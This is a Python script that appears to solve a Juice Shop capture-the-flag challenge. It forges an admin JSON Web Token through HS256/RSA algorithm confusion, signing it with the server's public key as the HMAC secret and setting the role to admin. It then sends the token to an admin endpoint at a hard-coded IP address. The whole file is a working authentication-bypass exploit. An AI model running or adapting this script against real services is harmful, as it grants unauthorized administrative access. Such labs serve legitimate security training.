import base64
import json
import hmac
import hashlib
import requests

class JWTAttack:
    def __init__(self):
        self.base_url = "http://45.76.47.218:3000"
        self.session = requests.Session()
        self.key = "MIGJAoGBAM3CosR73CBNcJsLv5E90NsFt6qN1uziQ484gbOoule8leXHFbyIzPQRozgEpSpiwhr6d2/c0CfZHEJ3m5tV0klxfjfM7oqjRMURnH/rmBjcETQ7qzIISZQ/iptJ3p7Gi78X5ZMhLNtDkUFU9WaGdiEb+SnC39wjErmJSfmGb7i1AgMBAAE="

    def forge_token(self):
        header = {"typ":"JWT","alg":"HS256"}
        payload = {
            "status":"success",
            "data":{
                "id":32,
                "username":"",
                "email":"rsa_lord@juice-sh.op",
                "password":"5f4dcc3b5aa765d61d8327deb882cf99",
                "role":"admin",
                "deluxeToken":"",
                "lastLoginIp":"0.0.0.0",
                "profileImage":"/assets/public/images/uploads/default.svg",
                "totpSecret":"",
                "isActive":True,
                "createdAt":"2025-01-17 11:21:30.307 +00:00",
                "updatedAt":"2025-01-17 12:22:15.867 +00:00",
                "deletedAt":None
            },
            "iat":1737122978
        }

        print("[*] Creating token with:")
        print(f"Email: {payload['data']['email']}")
        print(f"Algorithm: {header['alg']}")

        header_b64 = base64.urlsafe_b64encode(json.dumps(header, separators=(',',':')).encode()).rstrip(b'=').decode()
        payload_b64 = base64.urlsafe_b64encode(json.dumps(payload, separators=(',',':')).encode()).rstrip(b'=').decode()
        unsigned = f"{header_b64}.{payload_b64}"
        
        signature = hmac.new(
            base64.b64decode(self.key),
            unsigned.encode(),
            hashlib.sha256
        ).digest()
        signature_b64 = base64.urlsafe_b64encode(signature).rstrip(b'=').decode()
        
        return f"{unsigned}.{signature_b64}"

    def test_admin_access(self, token):
        headers = {"Authorization": f"Bearer {token}"}
        cookies = {"token": token}
        
        response = self.session.get(
            f"{self.base_url}/rest/admin/application-configuration", 
            headers=headers, 
            cookies=cookies
        )
        
        if response.status_code == 200:
            print(f"[+] Admin access successful!")
            print(f"[*] Response: {response.text[:200]}")
            return True
        else:
            print(f"[-] Admin access failed: {response.status_code}")
            return False

    def run_attack(self):
        print("[*] Starting JWT attack...")
        token = self.forge_token()
        print(f"[+] Forged token: {token}")
        
        if self.test_admin_access(token):
            print("[+] Challenge completed successfully!")
        else:
            print("[-] Challenge failed")

if __name__ == "__main__":
    JWTAttack().run_attack()